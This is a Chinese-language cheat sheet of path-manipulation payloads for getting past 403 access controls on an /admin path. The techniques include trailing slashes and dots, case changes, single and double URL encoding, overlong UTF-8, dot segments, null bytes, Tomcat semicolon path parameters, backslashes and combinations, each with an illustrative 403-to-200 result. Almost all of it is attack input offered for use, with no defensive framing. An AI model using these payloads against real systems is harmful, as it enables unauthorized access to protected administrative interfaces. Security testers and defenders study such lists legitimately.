# 路径操纵 Payload
## 1.1 尾部斜杠 / 点

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

## 1.2 大小写

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

代理规则区分大小写但后端不区分时有效（常见于 Windows/IIS）。

## 1.3 URL 编码

```
/admin          → 403
/%61dmin        → 200  ✓ (编码 'a')
/admi%6e        → 200  ✓ (编码 'n')
/%61%64%6d%69%6e → 200  ✓ (全编码)
```

## 1.4 双重 URL 编码

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25=%, 解码两次: %61→a)
/admin%252f         → 200  ✓
```

## 1.5 Unicode / UTF-8 过长编码

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 '.')
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

## 1.6 点段 / 路径穿越

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat 路径参数)
```

## 1.7 NULL 字节

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
```

## 1.8 路径参数注入（Java/Tomcat）

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat 将 ; 视为路径参数)
/admin;         → 200  ✓
/;/admin        → 200  ✓
```

## 1.9 尾部特殊字符

```
/admin%20       /admin%09       /admin?
/admin.json     /admin.html     /admin/~
```

## 1.10 反斜杠（Windows/IIS）

```
/admin\    /admin\..\/    \..\admin
```

## 1.11 组合

```
///admin///    /./admin/./    /admin/..;/admin    /%2e/admin
```
